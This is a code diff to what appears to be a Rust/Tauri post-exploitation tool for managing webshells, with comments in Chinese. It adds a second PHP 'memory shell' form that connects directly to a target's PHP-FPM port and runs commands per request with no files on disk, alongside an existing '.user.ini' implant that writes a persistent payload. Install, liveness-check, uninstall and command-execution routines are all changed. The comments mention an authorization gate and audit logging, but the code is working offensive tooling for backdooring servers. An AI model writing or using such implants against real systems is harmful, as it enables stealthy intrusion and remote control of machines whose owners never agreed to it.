@@ -3213,9 +3213,12 @@ pub async fn mcp_resolve_approval(
 
 // ---------------------------------------------------------------------------
 // 内存马（后渗透）。所有会改变目标状态的路径都必须：授权门 → 审计 → 可卸载。
+// 两种形态：
+//   php_user_ini —— 写 .user.ini + 载荷文件（持久，需卸载；有 cache_ttl 延迟）
+//   php_fcgi     —— 直连 FPM 逐请求执行（零落盘、无延迟、无残留需清理）
 // ---------------------------------------------------------------------------
 
-/// 查询当前目标支持的内存马形态（纯本地判定，零网络请求）。
+/// 查询当前目标支持的内存马形态。
 #[tauri::command]
 pub async fn memshell_capabilities(
     session_id: String,
@@ -3230,22 +3233,37 @@ pub async fn memshell_capabilities(
             sessions.get_mut(&session_id)?.info.clone()
         };
         let verdict = crate::memshell::php_user_ini_preconditions(&info);
-        Ok(vec![MemshellCapability {
-            kind: crate::memshell::KIND_PHP_USER_INI.to_string(),
-            runtime: "php".to_string(),
-            feasible: verdict.is_ok(),
-            reason: verdict.err(),
-        }])
+        Ok(vec![
+            MemshellCapability {
+                kind: crate::memshell::KIND_PHP_USER_INI.to_string(),
+                runtime: "php".to_string(),
+                feasible: verdict.is_ok(),
+                reason: verdict.err(),
+            },
+            // FPM 直连不依赖目标 SAPI 配置，但要求客户端能连到 FPM 端口；
+            // 可达性由安装时的 ping 实测，这里不做网络探测。
+            MemshellCapability {
+                kind: crate::memshell::KIND_PHP_FCGI.to_string(),
+                runtime: "php".to_string(),
+                feasible: true,
+                reason: None,
+            },
+        ])
     })
     .await
 }
 
-/// 注入 PHP `.user.ini` 内存马。
+/// 注入内存马。`kind = php_user_ini` 时用 install_dir/trigger_url；
+/// `kind = php_fcgi` 时用 fpm_target/script_filename。
 #[tauri::command]
+#[allow(clippy::too_many_arguments)]
 pub async fn memshell_install(
     session_id: String,
-    install_dir: String,
-    trigger_url: String,
+    kind: String,
+    install_dir: Option<String>,
+    trigger_url: Option<String>,
+    fpm_target: Option<String>,
+    script_filename: Option<String>,
     app: AppHandle,
 ) -> Result<MemoryShell, String> {
     blocking(app, move |state| {
@@ -3261,8 +3279,6 @@ pub async fn memshell_install(
             let session = sessions.get_mut(&session_id)?;
             (session.state.clone(), session.info.clone())
         };
-        crate::memshell::php_user_ini_preconditions(&info)?;
-
         let shell_id = ctx.shell.id.clone();
         let workspace_id = ctx.shell.workspace_id.clone();
         {
@@ -3279,43 +3295,98 @@ pub async fn memshell_install(
 
         let token = uuid::Uuid::new_v4().simple().to_string();
         let name = format!("m{}", &token[..8]);
-        let artifact = crate::memshell::php::install(
-            ctx.protocol,
-            session.as_ref(),
-            &ctx.settings,
-            install_dir.trim(),
-            &name,
-            &token,
-        )
-        .map_err(|error| format!("注入失败：{error}"))?;
-
-        // .user.ini 有 cache_ttl 延迟（默认 300s）：未立即生效时标 pending，
-        // 而不是报失败 —— 用户可稍后点「检测」。
-        let alive = crate::memshell::php::check(&ctx.settings, &trigger_url, &token, &name);
         let now = chrono::Utc::now().to_rfc3339();
-        let handle = MemoryShell {
-            id: uuid::Uuid::new_v4().to_string(),
-            workspace_id: workspace_id.clone(),
-            shell_id: Some(shell_id.clone()),
-            runtime: "php".to_string(),
-            kind: crate::memshell::KIND_PHP_USER_INI.to_string(),
-            name,
-            token,
-            endpoint: trigger_url.clone(),
-            install_path: artifact.payload_path.clone(),
-            artifact: serde_json::to_string(&artifact).map_err(|error| error.to_string())?,
-            status: if alive { "active" } else { "pending" }.to_string(),
-            installed_at: now.clone(),
-            last_check_at: if alive { Some(now) } else { None },
-            last_check_ok: alive,
-            uninstall_attempts: 0,
-            notes: if alive {
-                String::new()
-            } else {
-                "尚未生效：目标 PHP 会缓存 .user.ini（user_ini.cache_ttl，默认 300s），请稍后重试检测"
-                    .to_string()
-            },
+
+        let handle = if kind == crate::memshell::KIND_PHP_FCGI {
+            let target_value = fpm_target
+                .as_deref()
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .ok_or_else(|| "缺少 FPM 地址（例如 127.0.0.1:9000）".to_string())?;
+            let script = script_filename
+                .as_deref()
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .ok_or_else(|| "缺少 SCRIPT_FILENAME（目标上已存在的 PHP 文件）".to_string())?;
+            let target = crate::memshell::fcgi::FcgiTarget::parse(target_value)?;
+            let alive = crate::memshell::fcgi::check(&ctx.settings, &target, script, &token, &name);
+            MemoryShell {
+                id: uuid::Uuid::new_v4().to_string(),
+                workspace_id: workspace_id.clone(),
+                shell_id: Some(shell_id.clone()),
+                runtime: "php".to_string(),
+                kind: crate::memshell::KIND_PHP_FCGI.to_string(),
+                name,
+                token,
+                // endpoint 字段存 FPM 地址，保证句柄自足
+                endpoint: target.to_string_value(),
+                install_path: script.to_string(),
+                artifact: serde_json::json!({
+                    "target": target.to_string_value(),
+                    "script": script,
+                })
+                .to_string(),
+                status: if alive { "active" } else { "pending" }.to_string(),
+                installed_at: now.clone(),
+                last_check_at: if alive { Some(now) } else { None },
+                last_check_ok: alive,
+                uninstall_attempts: 0,
+                notes: if alive {
+                    "FPM 直连，零落盘、无残留需清理".to_string()
+                } else {
+                    "FPM 未响应：请确认端口可达、SCRIPT_FILENAME 存在".to_string()
+                },
+            }
+        } else if kind == crate::memshell::KIND_PHP_USER_INI {
+            crate::memshell::php_user_ini_preconditions(&info)?;
+            let dir = install_dir
+                .as_deref()
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .ok_or_else(|| "缺少安装目录".to_string())?;
+            let trigger = trigger_url
+                .as_deref()
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .ok_or_else(|| "缺少触发 URL".to_string())?;
+            let artifact = crate::memshell::php::install(
+                ctx.protocol,
+                session.as_ref(),
+                &ctx.settings,
+                dir,
+                &name,
+                &token,
+            )
+            .map_err(|error| format!("注入失败：{error}"))?;
+            let alive =
+                crate::memshell::php::check(&ctx.settings, trigger, &token, &name);
+            MemoryShell {
+                id: uuid::Uuid::new_v4().to_string(),
+                workspace_id: workspace_id.clone(),
+                shell_id: Some(shell_id.clone()),
+                runtime: "php".to_string(),
+                kind: crate::memshell::KIND_PHP_USER_INI.to_string(),
+                name,
+                token,
+                endpoint: trigger.to_string(),
+                install_path: artifact.payload_path.clone(),
+                artifact: serde_json::to_string(&artifact).map_err(|error| error.to_string())?,
+                status: if alive { "active" } else { "pending" }.to_string(),
+                installed_at: now.clone(),
+                last_check_at: if alive { Some(now) } else { None },
+                last_check_ok: alive,
+                uninstall_attempts: 0,
+                notes: if alive {
+                    String::new()
+                } else {
+                    "尚未生效：目标 PHP 会缓存 .user.ini（user_ini.cache_ttl，默认 300s），请稍后重试检测"
+                        .to_string()
+                },
+            }
+        } else {
+            return Err(format!("不支持的内存马形态：{kind}"));
         };
+
         {
             let database = state
                 .database
@@ -3329,10 +3400,10 @@ pub async fn memshell_install(
                     Some(&workspace_id),
                     Some(&shell_id),
                     "memshell.inject",
-                    if alive { "success" } else { "pending" },
+                    if handle.last_check_ok { "success" } else { "pending" },
                     &format!(
-                        "形态：{}；路径：{}；端点：{trigger_url}",
-                        handle.kind, handle.install_path
+                        "形态：{}；目标：{}；位置：{}",
+                        handle.kind, handle.endpoint, handle.install_path
                     ),
                 )
                 .map_err(|error| error.to_string())?;
@@ -3342,7 +3413,7 @@ pub async fn memshell_install(
     .await
 }
 
-/// 存活检测。可反复调用（`pending` 状态会因 TTL 过期而转为 active）。
+/// 存活检测。可反复调用（`pending` 状态会因 cache_ttl 过期而转为 active）。
 #[tauri::command]
 pub async fn memshell_check(handle_id: String, app: AppHandle) -> Result<bool, String> {
     blocking(app, move |state| {
@@ -3361,8 +3432,18 @@ pub async fn memshell_check(handle_id: String, app: AppHandle) -> Result<bool, S
         if !settings.http_enabled {
             return Err("真实网络协议未开启，无法检测".to_string());
         }
-        let alive =
-            crate::memshell::php::check(&settings, &handle.endpoint, &handle.token, &handle.name);
+        let alive = if handle.kind == crate::memshell::KIND_PHP_FCGI {
+            let target = crate::memshell::fcgi::FcgiTarget::parse(&handle.endpoint)?;
+            crate::memshell::fcgi::check(
+                &settings,
+                &target,
+                &handle.install_path,
+                &handle.token,
+                &handle.name,
+            )
+        } else {
+            crate::memshell::php::check(&settings, &handle.endpoint, &handle.token, &handle.name)
+        };
         let status = if alive {
             "active".to_string()
         } else if handle.status == "orphaned" {
@@ -3393,10 +3474,12 @@ pub async fn memshell_check(handle_id: String, app: AppHandle) -> Result<bool, S
     .await
 }
 
-/// 中和内存马（改写为无害占位 + 摘除 `.user.ini`）。
+/// 中和内存马。
 ///
-/// **不删除载荷文件**：目标 PHP 会缓存 `.user.ini` 的 prepend 路径，
-/// 文件缺失会让站点在 TTL 内每个请求 500（已实测）。
+/// - `php_fcgi`：零落盘，无残留，直接标记为已卸载；
+/// - `php_user_ini`：改写为无害占位 + 摘除 `.user.ini`。**不删除载荷文件** ——
+///   目标 PHP 会缓存 `.user.ini` 的 prepend 路径，文件缺失会让站点在 TTL 内每个
+///   请求 500（已实测）。
 #[tauri::command]
 pub async fn memshell_uninstall(handle_id: String, app: AppHandle) -> Result<String, String> {
     blocking(app, move |state| {
@@ -3412,12 +3495,30 @@ pub async fn memshell_uninstall(handle_id: String, app: AppHandle) -> Result<Str
             let settings = database.get_settings().map_err(|error| error.to_string())?;
             (handle, settings)
         };
-        let outcome =
-            crate::memshell::php::uninstall_via_payload(&settings, &handle.endpoint, &handle.token);
+
         let database = state
             .database
             .lock()
             .map_err(|_| "数据库锁异常".to_string())?;
+
+        if handle.kind == crate::memshell::KIND_PHP_FCGI {
+            database
+                .update_memory_shell_check(&handle.id, "uninstalled", false)
+                .map_err(|error| error.to_string())?;
+            database
+                .record_audit(
+                    Some(&handle.workspace_id),
+                    handle.shell_id.as_deref(),
+                    "memshell.uninstall",
+                    "success",
+                    &format!("句柄：{}；FPM 直连形态零落盘，无残留", handle.id),
+                )
+                .map_err(|error| error.to_string())?;
+            return Ok("FPM 直连形态不落盘，已直接关闭记录（目标上无残留）".to_string());
+        }
+
+        let outcome =
+            crate::memshell::php::uninstall_via_payload(&settings, &handle.endpoint, &handle.token);
         match outcome {
             Ok(()) => {
                 database
@@ -3501,8 +3602,19 @@ pub async fn memshell_exec(
         if !settings.http_enabled {
             return Err("真实网络协议未开启".to_string());
         }
-        let output =
-            crate::memshell::php::exec(&settings, &handle.endpoint, &handle.token, &command)?;
+        let output = if handle.kind == crate::memshell::KIND_PHP_FCGI {
+            let target = crate::memshell::fcgi::FcgiTarget::parse(&handle.endpoint)?;
+            crate::memshell::fcgi::exec(
+                &settings,
+                &target,
+                &handle.install_path,
+                &handle.token,
+                &handle.name,
+                &command,
+            )?
+        } else {
+            crate::memshell::php::exec(&settings, &handle.endpoint, &handle.token, &command)?
+        };
         state
             .database
             .lock()
